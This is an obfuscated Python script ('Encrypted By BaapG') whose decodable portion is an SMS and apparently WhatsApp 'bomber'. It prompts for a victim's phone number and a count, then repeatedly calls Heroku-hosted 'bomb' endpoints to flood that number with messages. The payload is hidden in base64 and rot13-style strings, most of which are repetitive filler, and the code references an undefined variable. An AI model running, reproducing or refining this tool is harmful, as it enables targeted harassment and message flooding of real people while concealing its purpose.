# Python Code Encrypted By BaapG
# Thanks Hiru
 

import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKdHJ5OgoJaW1wb3J0IGNvbG9yYW1hCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOgoJcHJpbnQoImNvbG9yYW1hIGlzIG5vdCBJbnN0YWxsZWQiKQoJb3Muc3lzdGVtKCJwaXAgaW5zdGFsbCBjb2xvcmFtYSIpCnRyeToKCWltcG9ydCByZXF1ZXN0cwpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoKCXByaW50KCJSZXF1ZXN0cyBpcyBub3QgSW5zdGFsbGVkIikKCW9zLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMiKQpkZWYgY2hlY2tfaW50cigpOgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9tb3RoZXJmdWNraW5nd2Vic2l0ZS5jb20iKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwcmludCgiQWJlIENodXRpeWEgSW50ZXJuZXQgT24gS2FyLiBJbnRlcm5ldCBFcnJvciIpCiAgICAgICAgc3lzLmV4aXQoMikKZnJvbSBjb2xvcmFtYSBpbXBvcnQgIEZvcmUsU3R5bGUKUiA9IEZvcmUuUkVECkIgPSBGb3JlLkJMVUUKRyA9IEZvcmUuR1JFRU4KQyA9IEZvcmUuQ1lBTgpZICA9IEZvcmUuWUVMTE9XCk0gPSBGb3JlLk1BR0VOVEEKVyA9IEZvcmUuV0hJVEUKUkVEPSIkKHByaW50ZiAnXGVbMzFtJykiCkdSRUVOPSIkKHByaW50ZiAnXGVbMzJtJykiCk9SQU5HRT0iJChwcmludGYgJ1xlWzMzbScpIgpCTFVFPSIkKHByaW50ZiAnXGVbMzRtJykiCk1BR0VOVEE9IiQocHJpbnRmICdcZVszNW0nKSIKQ1lBTj0iJChwcmludGYgJ1xlWzM2bScpIgpXSElURT0iJChwcmludGYgJ1xlWzM3bScpIgpCTEFDSz0iJChwcmludGYgJ1xlWzMwbScpIgpsaWMgPSAiIiIKIyAgQ29weXJpZ2h0IDIwMjEgVER5bmFtb3MgPHRkeW5hbW9zQGxpbnV4PgojICAKIyAgVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKIyAgaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkKIyAgdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbjsgZWl0aGVyIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IKIyAgKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0ZXIgdmVyc2lvbi4KIyAgCiMgIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAojICBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgojICBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCiMgIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCiMgIAojICBZb3Ugc2hvdWxkIGhhdmUgcmVjZWl2ZWQgYSBjb3B5IG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZQojICBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJlZSBTb2Z0d2FyZQojICBGb3VuZGF0aW9uLCBJbmMuLCA1MSBGcmFua2xpbiBTdHJlZXQsIEZpZnRoIEZsb29yLCBCb3N0b24sawojICBNQSAwMjExMC0xMzAxLCBVU0EuCiMgaWYgWW91IEhhdmUgQW55IFByb2JsZW0gQ29udGFjdCBNZSBPbiBJbnN0YSBAa3Jpc2hfbmFfMjU2OAojIEdoYXppcHVyIFVwIEluZGlhIAojIE15IEluc3RhIEBLcmlzaF9uYV8yNTY4CiIiIgoKbG9nbyA9IGYiIiIKe1J94pWt4pSB4pSB4pWu4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWt4pSB4pSB4pSB4pWuIOKVreKUgeKUgeKUgeKVruKVreKVruKVseKVreKVruKVseKVseKVseKVseKVseKVseKVreKVrgp7Un3ilIPila3ila7ilIPilbHilbHilbHilbHilbHilbHilbHilbHilbHilIPila3ilIHila7ilIMg4pSD4pWt4pSB4pWu4pSj4pWv4pWw4pSz4pWv4pWw4pWu4pWx4pWx4pWx4pWx4pWx4pSD4pSDCntXfeKUg+KVsOKVr+KVsOKUs+KUgeKUgeKUs+KUgeKUgeKUs+KUgeKUgeKUq+KUg+KVseKVsOKVryDilIPilIPilbHilIPilKPila7ila3ilLvila7ila3ilYvilIHilIHilLPilIHilIHilKvilIPila3ila4Ke1d94pSD4pWt4pSB4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pWt4pWu4pSD4pSD4pWt4pSB4pWuIOKUg+KVsOKUgeKVr+KUg+KUg+KUg+KVseKUg+KUg+KUg+KVreKVruKUg+KVreKUgeKUq+KVsOKVr+KVrwp7R33ilIPilbDilIHila/ilIPila3ila7ilIPila3ila7ilIPilbDila/ilIPilbDilLvilIHilIMg4pSD4pWt4pSB4pWu4pSD4pSD4pWw4pWu4pSD4pWw4pSr4pWt4pWu4pSD4pWw4pSB4pSr4pWt4pWu4pWuCntHfeKVsOKUgeKUgeKUgeKUu+KVr+KVsOKUu+KVr+KVsOKUq+KVreKUgeKUu+KUgeKUgeKUgeKVryDilbDila/ilbHilbDila/ilbDilIHila/ilbDilIHilLvila/ilbDilLvilIHilIHilLvila/ilbDila8K4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pWx4pSD4pSDIHtDfUF1dGhvciA6IHtZfUJhYXBHIEtyaXNobmEge1l9UmFqcHV0CuKVseKVseKVseKVseKVseKVseKVseKVseKVseKVseKVsOKVryB7Q31Db2RlciAgOiB7WX1BbnNoIERhZHdhbAogIiIiCm9zLnN5c3RlbSgnY2xlYXInKQpkZWYgc21zKCk6CgljaGVja19pbnRyKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQoU3R5bGUuQlJJR0hUK2xvZ28pCglwcmludChHKQoJbnVtYmVyPWlucHV0KGYie0d9W3tXfSt7R31dIEVudGVyIHRoZSBWaWN0aW0ncyBQaG9uZSBudW1iZXIgXG5cbntXfS0tLS0te1J9IyB7Q30iKQoJcHJpbnQoKQoJY3Jhc2g9aW50KGlucHV0KGYne0d9W3tXfSt7R31dIEhvdyBNYW55IHRpbWVzIGRvIHlvdSB3YW50IHRvIFNlbmQgW3tXfTF7R31dIEJldHRlclxuXG57Un0+Pj57R30gJykpCglsaW5rID0gZiJodHRwczovL2JhYXBnLXRlc3QzMDAuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJbGluazEgPSBmImh0dHBzOi8vcnViYS14MTIuaGVyb2t1YXBwLmNvbS9ib21iP251bWJlcj17bnVtYmVyfSIKCWxpbmsyID0gZiJodHRwczovL2JhYXBnLXRlc3QzMDAuaGVyb2t1YXBwLmNvbS9ib21iL3tudW1iZXJ9IgoJZm9yIGkgaW4gcmFuZ2UgKGNyYXNoKToKCQlwcmludCgpCgkJcHJpbnQoZiJ7WX1b4pyTXSBTZW5kaW5nIE5vdyIpCgkJcmVxdWVzdHMuZ2V0KGxpbmspCgkJcmVxdWVzdHMuZ2V0KGxpbmsxKQoJCXJlcXVlc3RzLmdldChsaW5rMikKCQlyZXF1ZXN0cy5nZXQobGluazMpCgkJcHJpbnQoZiJ7R30gU3VjY2Vzc2Z1bCBTZW5kIPCfkY0iKQoJCQkJCglyZXMoKQpkZWYgd3Bib21iKCk6CgljaGVja19pbnRyKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQobG9nby'
love = 'xXPKOlnJ50XRpcPtyhqJ1vMKV9nJ5jqKDbMvW7E31or1q9X3gUsI0tr0q9EJ50MKVtIzywqTygW3ZtHTuiozHtoaIgLzIlVUqcqTttL291oaElrFOQo2EyKT5poagFsG4+CagUsFNvXDbWpUWcoaDbXDbWL3Wup2t9nJ50XTyhpUI0XTLar0q9J3gKsFg7E31qVRIhqTIlVUEbMFOhqJ1vMKVto2LtL3Wup2uyplO7D30bGJS4VQRjZQNjXFOpoykhr0q9CG4tWlxcPtyfnJ5eVQ0tXTLvVvW4MTpgo3OyovObqUEjpmbiY3quYz1yY3ghqJ1vMKW9Ym90MKu0CHWuLKOUWGVjFzScWGVjFTyhMPITZPH5EvH5ZvIOZlHlZRqbLKccpUIlWGVjIKNyZwOWozEcLFITZPH5EvH5ZvIOZlHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHlZPISZvH4ZPH4DFHjDFITZPH5EvH5BPH4BRMioTkiqlHlZR1yWGVjG24yZwOWoaA0LFHlZPH0ZTglnKAbK25uKmV1AwtyEwNyBHLyDGDyDGZyZRRyEwNyBHLyBGDyDGIVDIxyZwORIHEOWGVjGxyYDHtyZwOMIHfyZwOOI09YI09YWGVjWHLjWGyTWGx4WGt4WGOOXzu0qUOmWGAOWGWTWGWTrJ91qUHhLzHyZxL0Hl1cZQp4YIyMEFbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFcJFIWHEItyZwOPIHSHDH4yZwOAHvHlZSMWHyIGWGVjDyIYDH4yZwOYDHkSGxpyDmVyDwVdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOWHLjWGyTWGxmWGuQDyxyEGVyBQNyDGWAHvISZvH4ZPIOZyMIHyIGYIADGFITZPH5EvH5ZvIO'
god = 'MyUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4ODg4ODg4ODgqJTBBKjk5OTk5OTk5OTkqJTIwKkJhYXBHKiUyMCo5OTk5OTk5OTk5KiUwQSo4ODg4ODg4ODg4KiUyMCpCYWFwRyolMjAqODg4ODg4ODg4OColMEEqOTk5OTk5OTk5OSolMjAqQmFhcEcqJTIwKjk5OTk5OTk5OTkqJTBBKjg4ODg4ODg4ODgqJTIwKkJhYXBHKiUyMCo4ODg4ODg4ODg4KiUwQSo5OTk5OTk5OTk5KiUyMCpCYWFwRyolMjAqOTk5OTk5OTk5OSolMEEqODg4ODg4ODg4OColMjAqQmFhcEcqJTIwKjg4OD'
destiny = 't4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPLJSjElbyZwNdBGx5BGx5BGx5BFbyZRRdBQt4BQt4BQt4BPbyZwNdDzSupRpdWGVjXwt4BQt4BQt4BQtdWGOOXwx5BGx5BGx5BGxdWGVjXxWuLKOUXvHlZPb5BGx5BGx5BGx5XvHjDFb4BQt4BQt4BQt4XvHlZPcPLJSjElbyZwNdBQt4BQt4BQt4BPbyZRRdBGx5BGx5BGx5BFbyZwNdDzSupRpdWGVjXwx5BGx5BGx5BGxdWGOOXwt4BQt4BQt4BQtdWGVjXxWuLKOUXvHlZPb4BQt4BQt4BQt4XvHjDFb5BGx5BGx5BGx5XvHlZPcPL